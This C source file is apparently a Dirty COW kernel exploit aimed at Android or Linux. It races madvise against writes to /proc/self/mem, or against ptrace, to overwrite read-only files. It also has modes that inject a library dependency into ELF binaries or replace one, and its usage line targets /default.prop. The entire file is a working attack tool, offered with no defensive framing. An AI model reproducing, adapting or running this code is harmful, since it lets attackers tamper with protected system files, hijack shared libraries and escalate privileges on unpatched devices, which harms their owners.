//
// Created by k.leyfer on 15.03.2017.
//

#include "dirty_copy.h"
#include "elf_parser.h"

pid_t g_pid;

struct mem_arg {
  void *offset;
  void *patch;
  off_t patch_size;
  const char *fname;
  volatile int stop;
  volatile int success;
};

static void *check_thread(void *arg) {
  struct mem_arg *mem_arg;
  mem_arg = (struct mem_arg *) arg;
  struct stat st;
  int i;
  char *new_data = malloc(sizeof(char) * mem_arg->patch_size);
  for (i = 0; i < TIMEOUT && !mem_arg->stop; i++) {
    int fd = open(mem_arg->fname, O_RDONLY);
    if (fd == -1) {
      warn("Could not open %s: %s!", mem_arg->fname, strerror(errno));
      break;
    }

    if (fstat(fd, &st) == -1) {
      warn("Could not stat %s: %s!", mem_arg->fname, strerror(errno));
      close(fd);
      break;
    }

    read(fd, new_data, mem_arg->patch_size);
    close(fd);

    if (memcmp(new_data, mem_arg->patch, mem_arg->patch_size) == 0) {
      mem_arg->stop = 1;
      mem_arg->success = 1;
      return 0;
    }

    usleep(100 * 1000);
  }

  mem_arg->stop = 1;
  return 0;
}

static void *madvise_thread(void *arg) {
  struct mem_arg *mem_arg;
  mem_arg = (struct mem_arg *) arg;

  size_t size = mem_arg->patch_size;
  void *addr = (void *) (mem_arg->offset);

  int i = 0, c = 0;
  LOGV("madvise: %p %i", addr, size);
  for (i = 0; i < LOOP && !mem_arg->stop; i++) {
    c += madvise(addr, size, MADV_DONTNEED);
  }

  LOGV("madvise: %i %i", c, i);
  mem_arg->stop = 1;
  return 0;
}

static int ptrace_memcpy(pid_t pid, void *dest, const void *src, size_t n) {
  const unsigned char *s;
  long value;
  unsigned char *d;

  d = dest;
  s = src;

  while (n >= sizeof(long)) {
    memcpy(&value, s, sizeof(value));
    if (ptrace(PTRACE_POKETEXT, pid, d, value) == -1) {
      warn("ptrace(PTRACE_POKETEXT)");
      return -1;
    }

    n -= sizeof(long);
    d += sizeof(long);
    s += sizeof(long);
  }

  if (n > 0) {
    d -= sizeof(long) - n;

    errno = 0;
    value = ptrace(PTRACE_PEEKTEXT, pid, d, NULL);
    if (value == -1 && errno != 0) {
      warn("ptrace(PTRACE_PEEKTEXT)");
      return -1;
    }

    memcpy((unsigned char *) &value + sizeof(value) - n, s, n);
    if (ptrace(PTRACE_POKETEXT, pid, d, value) == -1) {
      warn("ptrace(PTRACE_POKETEXT)");
      return -1;
    }
  }

  return 0;
}

static void *ptrace_thread(void *arg) {
  struct mem_arg *mem_arg;
  mem_arg = (struct mem_arg *) arg;

  int i, c;
  for (i = 0; i < LOOP && !mem_arg->stop; i++) {
    c = ptrace_memcpy(g_pid, mem_arg->offset, mem_arg->patch, mem_arg->patch_size);
  }

  LOGV("ptrace: %i %i", c, i);

  mem_arg->stop = 1;
  return NULL;
}

static int can_write_to_self_mem(void *arg) {
  struct mem_arg *mem_arg;
  mem_arg = (struct mem_arg *) arg;
  int fd = open("/proc/self/mem", O_RDWR);
  if (fd == -1) {
    warn("Unable to open \"/proc/self/mem\": %s!", strerror(errno));
  }

  int returnval = -1;
  lseek(fd, (off_t) mem_arg->offset, SEEK_SET);
  if (write(fd, mem_arg->patch, mem_arg->patch_size) == mem_arg->patch_size) {
    returnval = 0;
  }

  close(fd);
  return returnval;
}

static void *proc_self_mem_thread(void *arg) {
  struct mem_arg *mem_arg;
  int fd, i, c = 0;
  mem_arg = (struct mem_arg *) arg;

  fd = open("/proc/self/mem", O_RDWR);
  if (fd == -1) {
    LOGV("Unable to open \"/proc/self/mem\": %s!\n", strerror(errno));
  }

  for (i = 0; i < LOOP && !mem_arg->stop; i++) {
    lseek(fd, (off_t) mem_arg->offset, SEEK_SET);
    c += write(fd, mem_arg->patch, mem_arg->patch_size);
  }

  LOGV("/proc/self/mem: %i %i", c, i);

  close(fd);

  mem_arg->stop = 1;
  return NULL;
}

static void exploit(struct mem_arg *mem_arg) {
  pthread_t pth1, pth2, pth3;

  LOGV("current: %p=%lx", (void *) mem_arg->offset, *(unsigned long *) mem_arg->offset);

  mem_arg->stop = 0;
  mem_arg->success = 0;

  if (can_write_to_self_mem(mem_arg) == -1) {
    LOGV("using ptrace");
    g_pid = fork();
    if (g_pid) {
      pthread_create(&pth3, NULL, check_thread, mem_arg);
      waitpid(g_pid, NULL, 0);
      ptrace_thread((void *) mem_arg);
      pthread_join(pth3, NULL);
    } else {
      pthread_create(&pth1, NULL, madvise_thread, mem_arg);
      ptrace(PTRACE_TRACEME);
      kill(getpid(), SIGSTOP);
      pthread_join(pth1, NULL);
    }
  } else {
    LOGV("using /proc/self/mem");
    pthread_create(&pth3, NULL, check_thread, mem_arg);
    pthread_create(&pth1, NULL, madvise_thread, mem_arg);
    pthread_create(&pth2, NULL, proc_self_mem_thread, mem_arg);
    pthread_join(pth3, NULL);
    pthread_join(pth1, NULL);
    pthread_join(pth2, NULL);
  }

  LOGV("result: %i %p=%lx", g_pid, (void *) mem_arg->offset, *(unsigned long *) mem_arg->offset);
}

static int open_file(const char *path, int *fd, size_t *size)
{
  *fd = open(path, O_RDONLY);
  if (*fd == -1) {
    LOGV("Could not open %s: %s!", path, strerror(errno));
    return -1;
  }

  struct stat st;
  if (fstat(*fd, &st) == -1) {
    LOGV("Could not stat %s: %s!", path, strerror(errno));
    close(*fd);
    *fd = -1;
    return -1;
  }

  *size = (size_t) st.st_size;
  return 0;
}

static int prepare_dirty_copy(const char *src_path, const char *dst_path, struct mem_arg *mem_arg)
{
  mem_arg->fname = src_path;

  int src_fd = -1;
  size_t src_size = 0;
  if (open_file(src_path, &src_fd, &src_size) == -1)
  {
    LOGV("Error opening %s!", src_path);
    return -1;
  }

  mem_arg->patch = malloc(src_size);
  if (mem_arg->patch == NULL)
  {
    LOGV("Unable to allocate %d bytes: %s!", src_size, strerror(errno));
    return -1;
  }

  memset(mem_arg->patch, 0, src_size);
  int readed;
  if ((readed = read(src_fd, mem_arg->patch, src_size)) != src_size)
  {
    LOGV("Error in read: expected %d, got %d", src_size, readed);
    if (readed == -1)
    {
      LOGV("Error: %s", strerror(errno));
    }

    close(src_fd);
    return -1;
  }

  mem_arg->patch_size = src_size;

  int dst_fd = -1;
  size_t dst_size = 0;
  if ((open_file(dst_path, &dst_fd, &dst_size) == -1))
  {
    LOGV("Could not open %s", dst_path);
    return -1;
  }

  void * map = mmap(NULL, src_size, PROT_READ, MAP_PRIVATE, dst_fd, 0);
  if (map == MAP_FAILED) {
    LOGV("Unable to mmap file: %s!", strerror(errno));
    close(dst_fd);
    return -1;
  }

  close(dst_fd);
  mem_arg->offset = map;
  return 0;
}

int inject_dependency_into_library(const char *path, const char *dependency_name)
{
  struct mem_arg mem_arg;
  if (prepare_dirty_copy(path, path, &mem_arg) == -1)
  {
    LOGV("Error preparing files!");
    return -1;
  }

  struct strtab_entry soname = {
      .type = NULL,
      .value = NULL
  };
  struct dependencies_info dependencies;
  get_strtable_values(mem_arg.patch, &dependencies, &soname);
  if (soname.value != NULL)
  {
    *soname.type = DT_NEEDED;
    strcpy(soname.value, dependency_name);
    LOGV("soname: %lu: %s", *soname.type, soname.value);
  }
  else
  {
    LOGV("Unable to locate soname!");
    return 0;
  }

  free(dependencies.entries);
  exploit(&mem_arg);
  return 0;
}

int replace_dependency_in_binary(const char* path, const char* old_dependency, const char* new_dependency)
{
  struct mem_arg mem_arg;
  if (prepare_dirty_copy(path, path, &mem_arg) == -1)
  {
    LOGV("Error preparing files!");
    return -1;
  }

  struct strtab_entry soname = {
      .type = NULL,
      .value = NULL
  };
  struct dependencies_info dependencies;
  get_strtable_values(mem_arg.patch, &dependencies, &soname);

  for (int i = 0; i < dependencies.size; ++i) {
    char* needed = dependencies.entries[i].value;
    LOGV("needed: %s", needed);
    if (strcmp(needed, old_dependency) == 0)
    {
      LOGV("Let's patch it");
      strcpy(needed, new_dependency);
    }
  }

  free(dependencies.entries);
  exploit(&mem_arg);
  return 0;
}

int copy_file(const char* src_path, const char* dst_path)
{
  int src_fd = open(src_path, O_RDONLY);
  if (src_fd == -1)
  {
    LOGV("unable to open %s: %s", src_path, strerror(errno));
  }
  int dst_fd = open(dst_path, O_WRONLY | O_CREAT);
  if (dst_fd == -1)
  {
    LOGV("unable to open %s: %s", dst_path, strerror(errno));
  }

  int bufsize = 4096;
  void* buf = (void*)malloc(bufsize);
  int readed = 0;
  do {
    readed = read(src_fd, buf, bufsize);
    if (readed > 0)
    {
      int written = write (dst_fd, buf, readed);
      LOGV("written %d", written);
      if (written == -1)
      {
        LOGV("unable to write: %s", strerror(errno));
        return -1;
      }
    }

    LOGV("%d readed", readed);
  } while(readed > 0);

  close(src_fd);
  close(dst_fd);
  return 0;
}

int dirty_copy(const char *src_path, const char *dst_path) {
  struct mem_arg mem_arg;
  if (prepare_dirty_copy(src_path, dst_path, &mem_arg) == -1)
  {
    LOGV("Unable to prepare files!");
    return -1;
  }

  exploit(&mem_arg);

  if (mem_arg.success == 0) {
    return -1;
  }

  return 0;
}

int main(int argc, const char *argv[]) {
  if (argc < 2) {
    LOGV("usage %s /data/local/tmp/default.prop /default.prop", argv[0]);
    return 0;
  }

  if (strcmp(argv[1], "-c") == 0)
  {
    LOGV("Copy %s to %s", argv[2], argv[3]);
    int res = copy_file(argv[2], argv[3]);
    if (chmod(argv[3], 0777) != 0)
    {
      LOGV("Unable to chmod: %s", strerror(errno));
    }

    return res;
  }

  if (strcmp(argv[1], "-d") == 0)
  {
    LOGV("Dirty copy %s to %s", argv[2], argv[3]);
    return dirty_copy(argv[2], argv[3]);
  }

  if (strcmp(argv[1], "-id") == 0)
  {
    LOGV("Inject dependency %s into %s", argv[3], argv[2]);
    return inject_dependency_into_library(argv[2], argv[3]);
  }

  if (strcmp(argv[1], "-rd") == 0)
  {
    LOGV("Replace dependency in %s from %s to %s", argv[2], argv[3], argv[4]);
    return replace_dependency_in_binary(argv[2], argv[3], argv[4]);
  }
}
